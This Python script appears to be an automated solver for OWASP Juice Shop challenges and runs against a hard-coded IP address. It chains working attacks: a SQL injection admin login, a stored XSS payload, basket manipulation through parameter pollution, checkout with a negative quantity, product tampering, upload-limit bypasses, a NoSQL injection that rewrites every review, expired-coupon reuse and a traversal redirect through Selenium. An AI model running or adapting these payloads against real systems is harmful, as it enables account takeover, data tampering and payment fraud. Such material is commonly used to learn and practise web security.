from urllib.request import urlopen, Request
from json import dumps, load
from random import randint

response = urlopen(
	Request(
		"http://15.236.144.183:8082/rest/user/login",
		data=dumps({
			"email":"admin' or 1=1;--",
			"password":"password",
		}).encode(),
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss"
			),
		},
	)
)
auth = load(response)["authentication"]
token = auth["token"]
bid = auth["bid"]
print("[+] Success: Login Admin")

response = urlopen(
	Request(
		"http://15.236.144.183:8082/#/administration",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
	)
)

response = urlopen(
	Request(
		"http://15.236.144.183:8082/rest/user/authentication-details/",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
	)
)
print("[+] Success: Administration Section")

response = urlopen(
	Request(
		"http://15.236.144.183:8082/api/Products/6",
		method="PUT",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps({"description": '<iframe src="javascript:alert(`xss`)">'}).encode(),
	)
)
print("[+] Success: API-Only XSS")

for a in range(25):
	try:
		response = urlopen(
			Request(
				"http://15.236.144.183:8082/api/BasketItems/",
				method="POST",
				headers={
					"Accept": "application/json, text/plain, */*",
					"Content-Type": "application/json",
					"Origin": "http://15.236.144.183:8082",
					"Referer": "http://15.236.144.183:8082/",
					"Cookie": (
						"language=en; welcomebanner_status=dismiss;"
						" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
						"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
						"_status=dismiss; token=" + token
					),
					"Authorization": "Bearer " + token,
				},
				data=dumps({"ProductId":randint(1, 35),"BasketId":str(bid),"quantity":1}).replace('"quantity"', f'"BasketId":"{str(bid + 1)}","quantity"').encode(),
			)
		)
	except Exception as e:
		print(e.read().decode())
	else:
		break
print("[+] Success: Manipulate Basket")

response = urlopen(
	Request(
		"http://15.236.144.183:8082/api/BasketItems/",
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps({"ProductId":randint(1, 35),"BasketId":str(bid),"quantity":-1000}).encode(),
	)
)
response = urlopen(
	Request(
		f"http://15.236.144.183:8082/rest/basket/{bid}/checkout",
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps({"couponData":"bnVsbA==","orderDetails":{"paymentId":"wallet","addressId":"3","deliveryMethodId":"3"}}).encode(),
	)
)
print("[+] Success: Payback Time")

response = urlopen(
	Request(
		f"http://15.236.144.183:8082/api/products/9",
		method="PUT",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps({"description": '<a href="https://owasp.slack.com" target="_blank">More...</a>'}).encode(),
	)
)
print("[+] Success: Product Tampering")

response = urlopen(
	Request(
		f"http://15.236.144.183:8082/file-upload",
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "multipart/form-data; boundary=---------------------------254971754620954617082235495690",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=b'-----------------------------254971754620954617082235495690\r\nContent-Disposition: form-data; name="file"; filename="test.pdf"\r\nContent-Type: application/pdf\r\n\r\n' + (b'a' * 150000) + b'\r\n-----------------------------254971754620954617082235495690--\r\n',
	)
)
print("[+] Success: Upload Size")

response = urlopen(
	Request(
		f"http://15.236.144.183:8082/file-upload",
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "multipart/form-data; boundary=---------------------------254971754620954617082235495690",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=b'-----------------------------254971754620954617082235495690\r\nContent-Disposition: form-data; name="file"; filename="test.jpeg"\r\nContent-Type: image/jpeg\r\n\r\n' + (b'a' * 150000) + b'\r\n-----------------------------254971754620954617082235495690--\r\n',
	)
)
print("[+] Success: Upload Type")

response = urlopen(
	Request(
		f"http://15.236.144.183:8082/rest/products/reviews",
		method="PATCH",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps(
			{
				'id': {
					'$ne': -1,
				},
				'message': 'pwned',
			}
		).encode(),
	)
)
# print(dumps(load(response), indent=4))
print("[+] Success: NoSQL Manipulation")

response = urlopen(
	Request(
		"http://15.236.144.183:8082/rest/basket/1/checkout",
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss; token=" + token
			),
			"Authorization": "Bearer " + token,
		},
		data=dumps({"couponData":"V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw","orderDetails":{"paymentId":"3","addressId":"3","deliveryMethodId":"3"}}).encode(),
	)
)
print("[+] Success: Expired Coupon")

from os import system
from sys import executable
system(executable + " -m pip install --require-virtualenv selenium > nul")

from selenium.webdriver import Firefox
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from time import sleep

driver = Firefox()
driver.get("http://15.236.144.183:8082/#/login")

driver.execute_script('if (document.getElementById("mat-dialog-0")) {document.getElementById("mat-dialog-0").getElementsByTagName("button")[1].click()}')

element = driver.find_element(By.ID, "email")
element.clear()
element.send_keys("admin' or 1=1;--")

element = driver.find_element(By.ID, "password")
element.clear()
element.send_keys("password")

element = driver.find_element(By.ID, "loginButton")
element.click()

driver.get("http://15.236.144.183:8082/#/administration")
sleep(1)
driver.get("http://15.236.144.183:8082/#/basket")

driver.execute_script('sessionStorage.bid = sessionStorage.bid + 1;')

driver.get("http://15.236.144.183:8082/#/basket")

driver.get("http://15.236.144.183:8082/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2F200%2F300%3Fq%3Dhttp:%2F%2Fleanpub.com%2Fjuice-shop")

sleep(10)

driver.close()